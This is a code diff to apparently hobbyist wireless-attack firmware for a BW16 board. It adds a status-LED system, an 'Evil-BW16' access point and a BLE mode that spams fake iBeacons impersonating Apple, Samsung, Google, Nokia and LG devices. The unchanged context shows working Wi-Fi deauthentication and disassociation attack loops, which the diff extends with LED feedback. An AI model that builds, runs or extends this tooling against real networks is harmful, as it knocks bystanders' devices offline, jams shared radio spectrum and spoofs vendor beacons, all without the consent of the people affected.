@@ -37,6 +37,8 @@
 #include "wifi_structures.h"
 #include "WiFi.h"
 #include "platform_stdlib.h"
+#include "BLEDevice.h"
+#include "BLEBeacon.h"
 
 // Undefine any existing min/max macros to prevent conflicts
 #ifdef min
@@ -49,13 +51,52 @@
 //==========================
 // User Configuration
 //==========================
-#define WIFI_SSID       "7h30th3r0n35Ghz"
-#define WIFI_PASS       "5Ghz7h30th3r0n3Pass"
+#define WIFI_SSID       "Evil-BW16"
+#define WIFI_PASS       "evilbw16"
 #define WIFI_CHANNEL    1
 
 bool USE_LED = true;
 bool DEBUG_MODE = false;  // Debug mode flag
 bool HIDDEN_AP = false;   // Set to true for hidden AP, false for visible AP
+
+//==========================
+// RGB Status LED layer
+// LED_R=PA12, LED_B=PA13, LED_G=PA14 (active HIGH, hardware verified)
+// States: 0=off, 1=idle(blue), 2=scan(green), 3=attack(red), 4=custom
+//==========================
+int led_state = 0;
+int led_custom_rgb[3] = {0, 0, 0};
+
+void ledApply() {
+  int r = 0, g = 0, b = 0;
+  if (USE_LED) {
+    switch (led_state) {
+      case 1: b = 1; break;                               // idle: blue
+      case 2: g = 1; break;                               // scanning: green
+      case 3: r = 1; break;                               // attacking: red
+      case 4: r = led_custom_rgb[0]; g = led_custom_rgb[1]; b = led_custom_rgb[2]; break;
+      default: break;                                     // off
+    }
+  }
+  digitalWrite(LED_R, r ? HIGH : LOW);
+  digitalWrite(LED_G, g ? HIGH : LOW);
+  digitalWrite(LED_B, b ? HIGH : LOW);
+}
+
+void ledSet(int state) {
+  led_state = state;
+  ledApply();
+}
+
+// Blink a color then restore the current status color
+void ledBlink(int r, int g, int b, int ms) {
+  if (!USE_LED) return;
+  digitalWrite(LED_R, r ? HIGH : LOW);
+  digitalWrite(LED_G, g ? HIGH : LOW);
+  digitalWrite(LED_B, b ? HIGH : LOW);
+  delay(ms);
+  ledApply();
+}
 
 // Attack parameters
 unsigned long last_cycle     = 0;
@@ -657,7 +698,7 @@ int scanNetworks() {
   sendResponse("[INFO] Cleared previous scan results.");
   if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
     sendResponse("[INFO] WiFi scan started successfully.");
-    if (USE_LED) digitalWrite(LED_G, HIGH);
+    ledSet(2); // green while scanning
     delay(scan_time);
     sendResponse("[INFO] WiFi scan delay completed.");
     sendResponse("[INFO] Scan completed!");
@@ -665,7 +706,7 @@ int scanNetworks() {
     // Sort results by channel
     sortByChannel(scan_results);
     sendResponse("[INFO] Scan results sorted by channel.");
-    if (USE_LED) digitalWrite(LED_G, LOW);
+    ledSet((attack_enabled || disassoc_enabled) ? 3 : 1);
     return 0;
   } else {
     sendResponse("[ERROR] Failed to start the WiFi scan!");
@@ -736,13 +777,101 @@ void startTimedAttack(unsigned long durationMs) {
     attackStartTime    = millis();
     attackDuration     = durationMs;
     attack_enabled     = true;
+    ledSet(3); // red while attacking
 }
 
 void checkTimedAttack() {
   if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
     attack_enabled     = false;
     timedAttackEnabled = false;
+    ledSet(1); // back to idle blue
     sendResponse("[INFO] Timed attack ended.");
+  }
+}
+
+//==========================================================
+// BLE Features: scanner + rotating beacon spam
+//==========================================================
+bool ble_ready = false;
+bool ble_central_started = false;
+bool ble_peripheral_started = false;
+bool ble_spam_running = false;
+
+void bleScanCallback(T_LE_CB_DATA* p_data) {
+  BLEAdvertData dev;
+  dev.parseScanInfo(p_data);
+  String s = "[INFO][BLE] found ";
+  s += dev.getAddr().str();
+  if (dev.hasName()) {
+    s += " name=";
+    s += dev.getName();
+  }
+  sendResponse(s);
+}
+
+void bleStartScan() {
+  if (!ble_ready) { BLE.init(); ble_ready = true; }
+  if (ble_spam_running) {
+    ble_spam_running = false;
+    BLE.configAdvert()->stopAdv();
+  }
+  BLE.setScanCallback(bleScanCallback);
+  if (!ble_central_started) { BLE.beginCentral(0); ble_central_started = true; }
+  BLE.configScan()->setScanMode(GAP_SCAN_MODE_ACTIVE);
+  BLE.configScan()->setScanInterval(160);
+  BLE.configScan()->setScanWindow(80);
+  BLE.configScan()->updateScanParams();
+  BLE.configScan()->startScan(5000);
+  sendResponse("[INFO][BLE] Scanning for BLE devices (5 seconds)...");
+}
+
+void bleSpamTick() {
+  static uint32_t lastTick = 0;
+  if (millis() - lastTick < 200) return;
+  lastTick = millis();
+
+  // Rotate manufacturer IDs: Apple, Samsung, Google, Nokia, LG
+  static const uint16_t mfgIds[] = {0x004C, 0x0075, 0x00E0, 0x0006, 0x0059};
+  static uint8_t mfgIdx = 0;
+  mfgIdx = (uint8_t)((mfgIdx + 1) % 5);
+
+  iBeacon beacon;
+  beacon.setManufacturerId(mfgIds[mfgIdx]);
+  beacon.setRSSI((int8_t)0xBF); // calibrated power: -65 dBm
+  beacon.setMajor((uint16_t)random(0xFFFF));
+  beacon.setMinor((uint16_t)random(0xFFFF));
+
+  // Random v4-style UUID string
+  char uuidStr[37];
+  snprintf(uuidStr, sizeof(uuidStr),
+           "%08lx-%04x-4%03x-8%03x-%04x%08lx",
+           (unsigned long)random(0x7FFFFFFFL),
+           (unsigned)random(0x10000L),
+           (unsigned)random(0x1000L),
+           (unsigned)random(0x1000L),
+           (unsigned)random(0x10000L),
+           (unsigned long)random(0x7FFFFFFFL));
+  beacon.setUUID(uuidStr);
+
+  BLE.configAdvert()->stopAdv();
+  BLE.configAdvert()->setAdvData(beacon.getAdvData(), beacon.advDataSize);
+  BLE.configAdvert()->startAdv();
+}
+
+void bleSpamStart() {
+  if (!ble_ready) { BLE.init(); ble_ready = true; }
+  if (ble_central_started) BLE.configScan()->stopScan();
+  BLE.configAdvert()->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
+  if (!ble_peripheral_started) { BLE.beginPeripheral(); ble_peripheral_started = true; }
+  ble_spam_running = true;
+  sendResponse("[INFO][BLE] Beacon spam started (rotating fake iBeacons every 200ms).");
+}
+
+void bleSpamStop() {
+  if (ble_spam_running) {
+    ble_spam_running = false;
+    if (ble_ready) BLE.configAdvert()->stopAdv();
+    sendResponse("[INFO][BLE] Beacon spam stopped.");
   }
 }
 
@@ -756,7 +885,8 @@ bool isValidCommand(const String& command) {
     "random_attack", "attack_time", "start sniff", "sniff beacon", 
     "sniff probe", "sniff deauth", "sniff eapol", "sniff pwnagotchi",
     "sniff all", "stop sniff", "hop on", "hop off", "set ch", "set ",
-    "info", "help", "toggle_debug", "debug on", "debug off", "status"
+    "info", "help", "toggle_debug", "debug on", "debug off", "status",
+    "ble scan", "ble spam on", "ble spam off", "ble stop"
   };
   
   // Check if command starts with any valid command
@@ -817,12 +947,14 @@ void handleCommand(String command) {
   // Deauth Attack Commands
   if (command.equalsIgnoreCase("start deauther")) {
     attack_enabled = true;
+    ledSet(3); // red while attacking
     sendResponse("[INFO] Deauthentication Attack started.");
   }
   else if (command.equalsIgnoreCase("stop deauther")) {
     // Unified stop command: Stops all active attacks
     attack_enabled = false;
     disassoc_enabled = false;
+    ledSet(1); // back to idle blue
     sendResponse("[INFO] All attacks stopped.");
   }
   else if (command.equalsIgnoreCase("scan")) {
@@ -846,6 +978,7 @@ void handleCommand(String command) {
     // Restore previous attack states
     attack_enabled = prev_attack_enabled;
     disassoc_enabled = prev_disassoc_enabled;
+    ledSet((attack_enabled || disassoc_enabled) ? 3 : 1);
   }
   else if (command.equalsIgnoreCase("results")) {
     if (!scan_results.empty()) {
@@ -854,6 +987,24 @@ void handleCommand(String command) {
     else {
       sendResponse("[INFO] No scan results available. Try 'scan' first.");
     }
+  }
+
+  //==========================
+  // BLE Commands
+  //==========================
+  else if (command.equalsIgnoreCase("ble scan")) {
+    bleStartScan();
+  }
+  else if (command.equalsIgnoreCase("ble spam on")) {
+    bleSpamStart();
+  }
+  else if (command.equalsIgnoreCase("ble spam off")) {
+    bleSpamStop();
+  }
+  else if (command.equalsIgnoreCase("ble stop")) {
+    if (ble_ready && ble_central_started) BLE.configScan()->stopScan();
+    bleSpamStop();
+    sendResponse("[INFO][BLE] All BLE activity stopped.");
   }
 
   //==========================
@@ -876,6 +1027,7 @@ void handleCommand(String command) {
   else if (command.equalsIgnoreCase("disassoc")) {
     if (!disassoc_enabled) {
       disassoc_enabled = true;
+      ledSet(3); // red while attacking
       sendResponse("[INFO] Continuous Disassociation Attack started.");
     }
     else {
@@ -893,11 +1045,7 @@ void handleCommand(String command) {
       wifi_set_channel(randChannel);
       for (unsigned long j = 0; j < num_send_frames; j++) {
         wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, 2);
-        if (USE_LED) {
-          digitalWrite(LED_B, HIGH);
-          delay(50);
-          digitalWrite(LED_B, LOW);
-        }
+        ledBlink(0, 0, 1, 50); // blue TX blink, restores status color
         sendResponse("[RANDOM ATTACK] Deauth " + String(j + 1) + " => " + scan_results[idx].ssid +
                      " on channel " + String(randChannel));
         
@@ -1076,14 +1224,47 @@ void handleCommand(String command) {
       else if (key.equalsIgnoreCase("led")) {
         if (value.equalsIgnoreCase("on")) {
           USE_LED = true;
+          ledApply();
           sendResponse("[INFO] LEDs activated.");
         }
         else if (value.equalsIgnoreCase("off")) {
           USE_LED = false;
+          ledApply();
           sendResponse("[INFO] LEDs deactivated.");
         }
+        else if (value.equalsIgnoreCase("auto")) {
+          ledSet((attack_enabled || disassoc_enabled) ? 3 : 1);
+          sendResponse("[INFO] LEDs back to status colors (idle=blue, scan=green, attack=red).");
+        }
+        else if (value.indexOf(',') != -1) {
+          // Custom color: set led <r>,<g>,<b> with 0/1 per channel
+          int c[3] = {0, 0, 0};
+          int idx = 0;
+          String tok;
+          for (unsigned int i = 0; i <= value.length() && idx < 3; i++) {
+            char ch = (i < value.length()) ? value.charAt(i) : ',';
+            if (ch == ',') {
+              c[idx++] = (tok.toInt() != 0) ? 1 : 0;
+              tok = "";
+            }
+            else {
+              tok += ch;
+            }
+          }
+          if (idx == 3) {
+            led_custom_rgb[0] = c[0];
+            led_custom_rgb[1] = c[1];
+            led_custom_rgb[2] = c[2];
+            ledSet(4);
+            sendResponse("[INFO] Custom LED color set: R=" + String(c[0]) +
+                         " G=" + String(c[1]) + " B=" + String(c[2]));
+          }
+          else {
+            sendResponse("[ERROR] Usage: set led <0/1>,<0/1>,<0/1>  e.g. 'set led 1,0,1'");
+          }
+        }
         else {
-          sendResponse("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
+          sendResponse("[ERROR] Invalid value for LED. Use 'set led on', 'off', 'auto', or 'r,g,b' (0/1 each).");
         }
       }
       else if (key.equalsIgnoreCase("target")) {
@@ -1194,6 +1375,10 @@ void handleCommand(String command) {
     sendResponse("[INFO]  - stop sniff           : Stop sniffing.");
     sendResponse("[INFO]  - hop on               : Enable channel hopping.");
     sendResponse("[INFO]  - hop off              : Disable channel hopping.");
+    sendResponse("[INFO] BLE Commands:");
+    sendResponse("[INFO]  - ble scan             : Scan for nearby BLE devices (5 seconds).");
+    sendResponse("[INFO]  - ble spam on/off      : Rotate fake BLE beacons (Apple/Samsung/Google/Nokia/LG).");
+    sendResponse("[INFO]  - ble stop             : Stop BLE scan and beacon spam.");
     sendResponse("[INFO] Configuration Commands:");
     sendResponse("[INFO]  - set <key> <value>    : Update configuration values:");
     sendResponse("[INFO]      * ch X             : Set to specific channel X, or 'set ch 1,6,36' for multiple.");
@@ -1204,6 +1389,8 @@ void handleCommand(String command) {
     sendResponse("[INFO]      * start_channel    : Start channel for scanning (1 or 36).");
     sendResponse("[INFO]      * scan_cycles      : on/off - Enable or disable scan between cycles.");
     sendResponse("[INFO]      * led on/off       : Enable or disable LEDs.");
+    sendResponse("[INFO]      * led <r>,<g>,<b>  : Custom RGB color (0/1 each), e.g. 'set led 1,0,1'.");
+    sendResponse("[INFO]      * led auto         : Return to status colors (idle/scan/attack).");
     sendResponse("[INFO]      * debug on/off     : Enable or disable debug mode.");
     sendResponse("[INFO]      * debug true/false : Enable or disable debug mode.");
     sendResponse("[INFO]  - info                 : Display the current configuration.");
@@ -1250,11 +1437,7 @@ void targetAttack() {
       wifi_set_channel(target_aps[i].channel);
       for (unsigned long j = 0; j < num_send_frames; j++) {
         wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
-        if (USE_LED) {
-          digitalWrite(LED_B, HIGH);
-          delay(50);
-          digitalWrite(LED_B, LOW);
-        }
+        ledBlink(0, 0, 1, 50); // blue TX blink, restores status color
         sendResponse("[INFO] Deauth " + String(j + 1) + " => " + target_aps[i].ssid +
                      " (" + target_aps[i].bssid_str + ") on channel " +
                      String(target_aps[i].channel));
@@ -1299,11 +1482,7 @@ void attackCycle() {
 
     for (unsigned long j = 0; j < num_send_frames; j++) {
       wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, 2);
-      if (USE_LED) {
-        digitalWrite(LED_B, HIGH);
-        delay(50);
-        digitalWrite(LED_B, LOW);
-      }
+      ledBlink(0, 0, 1, 50); // blue TX blink, restores status color
       sendResponse("[INFO] Deauth " + String(j + 1) + " => " + scan_results[i].ssid +
                    " (" + scan_results[i].bssid_str + ") on channel " +
                    String(scan_results[i].channel));
@@ -1360,6 +1539,7 @@ void setup() {
     digitalWrite(LED_R, HIGH); digitalWrite(LED_G, HIGH); digitalWrite(LED_B, HIGH);
     delay(200);
     digitalWrite(LED_R, LOW); digitalWrite(LED_G, LOW); digitalWrite(LED_B, LOW);
+    ledSet(1); // idle blue after boot animation
   }
 
   if (HIDDEN_AP) {
@@ -1423,6 +1603,11 @@ void loop() {
   // Timed Attack check
   checkTimedAttack();
 
+  // Rotate BLE beacon spam payloads while active
+  if (ble_spam_running) {
+    bleSpamTick();
+  }
+
   // Attack cycles - Only run if explicitly enabled
   if(millis() - last_cycle > cycle_delay) {
     if(attack_enabled) {
@@ -1469,11 +1654,7 @@ void loop() {
         wifi_tx_disassoc_frame(aps_to_attack[i].bssid, dst_mac, 0x08); 
 
         // Optional LED blink
-        if(USE_LED) {
-          digitalWrite(LED_B, HIGH);
-          delay(50);
-          digitalWrite(LED_B, LOW);
-        }
+        ledBlink(0, 0, 1, 50); // blue TX blink, restores status color
 
         sendResponse("[INFO] Disassoc frame " + String(j + 1) + " => " + aps_to_attack[i].ssid +
                      " (" + aps_to_attack[i].bssid_str + ") on channel " +
